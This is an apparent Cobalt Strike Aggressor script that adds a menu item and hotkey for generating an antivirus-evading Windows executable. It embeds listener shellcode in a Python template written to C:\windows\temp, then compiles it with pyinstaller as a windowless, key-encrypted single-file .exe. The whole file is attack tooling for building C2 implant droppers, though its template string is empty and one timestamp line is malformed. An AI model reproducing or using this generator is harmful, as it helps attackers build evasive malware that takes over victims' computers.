popup attacks{
	item("&PyBypass_bate04",{Generator();});
}

bind Ctrl+G{
	Generator();
}

sub Generator{
	$dialog = dialog("Generator", %(listener => "" , bit => false), &build);
	drow_listener($dialog, "listener", "Listener: ");
	dialog_description($dialog, "Bypass by Pthon");
	dbutton_action($dialog, "Generate");
	drow_checkbox($dialog, "bit", "x64: ", "64   payload");
	dialog_show($dialog);
}

sub build{
    
	$a = $3["bit"] . "";

	if ($3["bit"] eq "false"){
		$system = "x86";
		$arch = "386";
	}else{
		$system = "x64";
		$arch = "amd64";
	}

	$code = gunzip(base64_decode(""));
	$shell_code = shellcode($3["listener"], false, $system);
	
	# 以时间做文件名
    $time = ticks() - (1000 * 60 * 60 8 23);
    $arg = formatDate($time, "yyyy_MM_dd_HH_mm_ss");
    $arg = $arg . ".exe";
   
    prompt_file_save($arg, {
        println("\n-------------\n  start\n-------------\n");

        # 获取用户选择的路径，
        $name = "$1";
		$name = replace($name, "\\\\", "\\\\\\\\");
        $codefile = "C:\\\\windows\\\\temp\\\\code.py";
        $tempfile = "C:\\\\windows\\\\temp\\\\temp.py";
		
		# 再删一编旧文件
        deleteFile($codefile);
        deleteFile($tempfile);

        # 替换shellcode与生成路径并写入
        $code = replace($code, '\$PAYLOAD\$', base64_encode($shell_code));
        $code = replace($code, 'name \# perch', 'r"' . $tempfile . '"');
     
        # 写入code.py
        $handle = openf("> $+ $codefile");
        writeb($handle, $code);
        closef($handle);
        println("writeb file");
        # $KEY = rand(255);
        
		# 生成恶意文件，删除旧编译文件，重新编译新文件
           exec("python  $+ $codefile");
        # println("python  $+ $codefile");
        
           exec("rd /s /q  dist");
        # println("rd /s /q  dist");

           exec("rd /s /q  build");
        # println("rd /s /q  build");
        
           exec("powershell pyinstaller5 --distpath   $+   $name  $+   --noconsole --key 1235123 --onefile  $+  $tempfile  $+    >  pyinstaller.log.this_is_y 2\>\&1");
        # println("powershell pyinstaller5 --distpath   $+   $name  $+   --noconsole --onefile  $+  $tempfile  $+    >  pyinstaller.log.this_is_y 2\>\&1");
    
        $name = $name . "\\\\" . getFileName($name);
        # println($name);
        if (-exists $name)
        {   
            println("file exits");
            deleteFile($codefile);
            deleteFile($tempfile);
        }
			
		show_message("python运行速度有点慢，save to  $+ $name ");
        # println("\n-------------\n   over\n-------------\n");
    });

}